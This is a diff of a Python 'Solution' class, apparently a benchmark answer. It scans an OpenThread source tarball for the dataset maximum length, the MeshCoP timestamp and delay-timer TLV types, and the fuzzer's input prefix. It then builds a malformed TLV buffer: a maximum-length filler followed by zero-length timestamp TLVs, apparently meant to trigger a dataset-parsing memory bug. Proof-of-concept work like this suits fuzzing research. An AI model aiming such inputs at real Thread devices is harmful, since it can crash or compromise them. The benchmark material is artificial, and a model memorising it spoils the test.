@@ -1,138 +1,211 @@
 import os
 import re
 import tarfile
-import tempfile
-from typing import Optional, Tuple
+from typing import Dict, Optional, Tuple
 
 
 class Solution:
-    def _maybe_extract(self, src_path: str) -> str:
-        if os.path.isdir(src_path):
-            return src_path
-        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
+    def _parse_int(self, s: str) -> Optional[int]:
+        s = s.strip()
+        if not s:
+            return None
+        try:
+            if s.lower().startswith("0x"):
+                return int(s, 16)
+            return int(s, 10)
+        except Exception:
+            return None
+
+    def _scan_tarball(self, src_path: str) -> Tuple[Optional[int], Dict[str, int], Optional[int]]:
+        max_len = None
+        types: Dict[str, int] = {}
+        prefix_nbytes = None
+
+        re_def_maxlen = re.compile(
+            r'(?m)^\s*#\s*define\s+OT_OPERATIONAL_DATASET_MAX_LENGTH\s+\(?\s*(0x[0-9a-fA-F]+|\d+)\s*\)?'
+        )
+        re_enum_maxlen = re.compile(
+            r'\bOT_OPERATIONAL_DATASET_MAX_LENGTH\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'
+        )
+
+        re_def_tlv = re.compile(
+            r'(?m)^\s*#\s*define\s+OT_MESHCOP_TLV_(ACTIVE_TIMESTAMP|PENDING_TIMESTAMP|DELAY_TIMER)\s+\(?\s*(0x[0-9a-fA-F]+|\d+)\s*\)?'
+        )
+        re_enum_k = re.compile(
+            r'\bk(ActiveTimestamp|PendingTimestamp|DelayTimer)\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'
+        )
+
+        re_fuzzer = re.compile(r'\bLLVMFuzzerTestOneInput\b')
+        re_dataset_keywords = re.compile(
+            r'\botDatasetSetActiveTlvs\b|\botDatasetSetPendingTlvs\b|\bOperationalDataset\b|\bMeshCoP::Dataset\b|\bDataset::IsTlvValid\b'
+        )
+        re_consume_size_t = re.compile(r'ConsumeIntegralInRange\s*<\s*size_t\s*>')
+        re_consume_u64 = re.compile(r'ConsumeIntegralInRange\s*<\s*uint64_t\s*>')
+        re_consume_u32 = re.compile(r'ConsumeIntegralInRange\s*<\s*uint32_t\s*>')
+        re_consume_u16 = re.compile(r'ConsumeIntegralInRange\s*<\s*uint16_t\s*>')
+        re_consume_u8 = re.compile(r'ConsumeIntegralInRange\s*<\s*uint8_t\s*>')
+        re_data_plus = re.compile(r'\bdata\s*\+\s*(\d+)\b')
+
+        def update_prefix_from_text(text: str) -> None:
+            nonlocal prefix_nbytes
+            if prefix_nbytes is not None:
+                return
+            if re_consume_size_t.search(text) or re_consume_u64.search(text):
+                prefix_nbytes = 8
+                return
+            if re_consume_u32.search(text):
+                prefix_nbytes = 4
+                return
+            if re_consume_u16.search(text):
+                prefix_nbytes = 2
+                return
+            if re_consume_u8.search(text):
+                prefix_nbytes = 1
+                return
+            m = re_data_plus.search(text)
+            if m:
+                v = self._parse_int(m.group(1))
+                if v is not None and v > 0:
+                    prefix_nbytes = v
+
         try:
             with tarfile.open(src_path, "r:*") as tf:
-                tf.extractall(tmpdir)
-        except Exception:
-            return tmpdir
-        # If tarball contains a single top-level directory, use it.
-        try:
-            entries = [e for e in os.listdir(tmpdir) if e not in (".", "..")]
-            if len(entries) == 1:
-                p = os.path.join(tmpdir, entries[0])
-                if os.path.isdir(p):
-                    return p
+                for member in tf:
+                    if not member.isfile():
+                        continue
+                    name = member.name
+                    if not (name.endswith((".h", ".hpp", ".hh", ".c", ".cc", ".cpp", ".cxx"))):
+                        continue
+                    if member.size <= 0 or member.size > 2_500_000:
+                        continue
+                    f = tf.extractfile(member)
+                    if f is None:
+                        continue
+                    try:
+                        data = f.read()
+                    finally:
+                        f.close()
+
+                    if (b"OT_OPERATIONAL_DATASET_MAX_LENGTH" not in data and
+                        b"ACTIVE_TIMESTAMP" not in data and
+                        b"PENDING_TIMESTAMP" not in data and
+                        b"DELAY_TIMER" not in data and
+                        b"LLVMFuzzerTestOneInput" not in data and
+                        b"otDatasetSetActiveTlvs" not in data and
+                        b"otDatasetSetPendingTlvs" not in data and
+                        b"IsTlvValid" not in data):
+                        continue
+
+                    text = data.decode("utf-8", "ignore")
+
+                    if max_len is None:
+                        m = re_def_maxlen.search(text)
+                        if m:
+                            v = self._parse_int(m.group(1))
+                            if v is not None:
+                                max_len = v
+                        if max_len is None:
+                            m = re_enum_maxlen.search(text)
+                            if m:
+                                v = self._parse_int(m.group(1))
+                                if v is not None:
+                                    max_len = v
+
+                    for m in re_def_tlv.finditer(text):
+                        k = m.group(1)
+                        v = self._parse_int(m.group(2))
+                        if v is None:
+                            continue
+                        if k == "ACTIVE_TIMESTAMP" and "active" not in types:
+                            types["active"] = v
+                        elif k == "PENDING_TIMESTAMP" and "pending" not in types:
+                            types["pending"] = v
+                        elif k == "DELAY_TIMER" and "delay" not in types:
+                            types["delay"] = v
+
+                    for m in re_enum_k.finditer(text):
+                        k = m.group(1)
+                        v = self._parse_int(m.group(2))
+                        if v is None:
+                            continue
+                        if k == "ActiveTimestamp" and "active" not in types:
+                            types["active"] = v
+                        elif k == "PendingTimestamp" and "pending" not in types:
+                            types["pending"] = v
+                        elif k == "DelayTimer" and "delay" not in types:
+                            types["delay"] = v
+
+                    if re_fuzzer.search(text) and re_dataset_keywords.search(text):
+                        update_prefix_from_text(text)
+
+                    if max_len is not None and len(types) == 3 and prefix_nbytes is not None:
+                        break
         except Exception:
             pass
-        return tmpdir
 
-    def _find_fuzzer_files(self, root: str, limit: int = 20) -> list:
-        out = []
-        for dirpath, dirnames, filenames in os.walk(root):
-            # prune common large dirs
-            dn = os.path.basename(dirpath)
-            if dn in ("build", "out", ".git", ".hg", ".svn", "third_party", "extern", "external"):
-                dirnames[:] = []
-                continue
-            for fn in filenames:
-                if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
-                    continue
-                if "fuzz" not in fn.lower() and "fuzzer" not in fn.lower():
-                    continue
-                p = os.path.join(dirpath, fn)
-                out.append(p)
-                if len(out) >= limit:
-                    return out
-        return out
+        return max_len, types, prefix_nbytes
 
-    def _detect_prefix_len(self, root: str) -> int:
-        # Heuristic: if the fuzz target offsets the input pointer by 1, add a leading byte.
-        candidates = self._find_fuzzer_files(root, limit=50)
-        for p in candidates:
-            try:
-                st = os.stat(p)
-                if st.st_size > 2_000_000:
-                    continue
-                with open(p, "r", encoding="utf-8", errors="ignore") as f:
-                    s = f.read()
-            except Exception:
-                continue
-            if "LLVMFuzzerTestOneInput" not in s:
-                continue
-            if re.search(r"\b(aData|data)\s*\+\s*1\b", s) and re.search(r"\b(aSize|size)\s*-\s*1\b", s):
-                if re.search(r"\bDataset\b", s, re.IGNORECASE) or re.search(r"\boperational\s*dataset\b", s, re.IGNORECASE):
-                    return 1
-        return 0
-
-    def _find_const(self, root: str, name: str) -> Optional[int]:
-        # Search common TLV header files first; fallback to broad scan.
-        preferred = []
-        for dirpath, dirnames, filenames in os.walk(root):
-            dn = os.path.basename(dirpath).lower()
-            if dn in ("build", "out", ".git", ".hg", ".svn"):
-                dirnames[:] = []
-                continue
-            for fn in filenames:
-                lfn = fn.lower()
-                if not fn.endswith((".h", ".hpp", ".c", ".cc", ".cpp", ".cxx")):
-                    continue
-                if "tlv" in lfn or "dataset" in lfn or "meshcop" in lfn:
-                    preferred.append(os.path.join(dirpath, fn))
-
-        pattern = re.compile(rf"(?:\b{name}\b)\s*=\s*(0x[0-9a-fA-F]+|\d+)\b")
-        for p in preferred:
-            try:
-                st = os.stat(p)
-                if st.st_size > 2_000_000:
-                    continue
-                with open(p, "r", encoding="utf-8", errors="ignore") as f:
-                    s = f.read()
-            except Exception:
-                continue
-            m = pattern.search(s)
-            if m:
-                v = m.group(1)
-                try:
-                    return int(v, 0)
-                except Exception:
-                    pass
-        return None
+    def _choose_filler_type(self, forbidden: set) -> int:
+        for t in (0xAA, 0xAB, 0xAC, 0x55, 0x5A, 0xE7, 0xF0, 0x7E):
+            if t not in forbidden:
+                return t
+        for t in range(0, 256):
+            if t not in forbidden:
+                return t
+        return 0xAA
 
     def solve(self, src_path: str) -> bytes:
-        root = self._maybe_extract(src_path)
-        prefix_len = self._detect_prefix_len(root)
+        max_len, types, prefix_nbytes = self._scan_tarball(src_path)
 
-        # Try to detect TLV type values from source; fall back to Thread MeshCoP defaults.
-        active_type = self._find_const(root, "kActiveTimestamp")
-        pending_type = self._find_const(root, "kPendingTimestamp")
-        if active_type is None:
-            active_type = 0x0E
-        if pending_type is None:
-            pending_type = 0x0F
+        if max_len is None:
+            max_len = 254
 
-        total_len = 262
-        tlvs_len = total_len
-        if prefix_len == 1:
-            total_len = 263
-            tlvs_len = 262
+        if "active" not in types:
+            types["active"] = 0
+        if "pending" not in types:
+            types["pending"] = 1
+        if "delay" not in types:
+            types["delay"] = 2
 
-        # Compose TLVs of exact length tlvs_len. Use a large "unknown" TLV as filler, then two truncated timestamps.
-        # TLV format: [type:1][len:1][value:len]
-        tail = bytes([active_type & 0xFF, 0x01, 0x00, pending_type & 0xFF, 0x01, 0x00])
-        filler_type = 0x80
-        filler_value_len = tlvs_len - len(tail) - 2
-        if filler_value_len < 0:
-            filler_value_len = 0
-        if filler_value_len > 255:
-            filler_value_len = 255
-        filler = bytes([filler_type, filler_value_len]) + (b"A" * filler_value_len)
+        if prefix_nbytes is None:
+            prefix_nbytes = 8
 
-        tlvs = filler + tail
-        if len(tlvs) < tlvs_len:
-            tlvs += b"B" * (tlvs_len - len(tlvs))
-        elif len(tlvs) > tlvs_len:
-            tlvs = tlvs[:tlvs_len]
+        # Ensure reasonable limits for TLV-length byte.
+        if max_len < 6:
+            max_len = 6
+        if max_len > 255:
+            max_len = 255
 
-        if prefix_len == 1:
-            return b"\x00" + tlvs
-        return tlvs
+        active_t = types["active"] & 0xFF
+        pending_t = types["pending"] & 0xFF
+        delay_t = types["delay"] & 0xFF
+
+        suffix = bytes([pending_t, 0x00, delay_t, 0x00, active_t, 0x00])
+
+        # Build TLVs buffer of length max_len:
+        # [unknown filler TLV (2 + filler_len)] + suffix(6)
+        filler_total = max_len - len(suffix)
+        if filler_total < 2:
+            # No room for filler header; just pad with 0 and suffix (best-effort).
+            tlvs = (b"\x00" * (max_len - len(suffix))) + suffix
+        else:
+            filler_len = filler_total - 2
+            if filler_len > 255:
+                filler_len = 255
+            forbidden = {active_t, pending_t, delay_t}
+            filler_type = self._choose_filler_type(forbidden) & 0xFF
+            tlvs = bytes([filler_type, filler_len]) + (b"\x00" * filler_len) + suffix
+            if len(tlvs) < max_len:
+                tlvs += b"\x00" * (max_len - len(tlvs))
+            elif len(tlvs) > max_len:
+                tlvs = tlvs[:max_len]
+
+        # If the fuzzer consumes a length first via ConsumeIntegralInRange<size_t>(0, MAX),
+        # set that length to max_len by making the raw integer equal to max_len.
+        if prefix_nbytes <= 0:
+            return tlvs
+        if prefix_nbytes > 16:
+            prefix_nbytes = 8
+
+        length_prefix = int(max_len).to_bytes(prefix_nbytes, "big", signed=False)
+        return length_prefix + tlvs
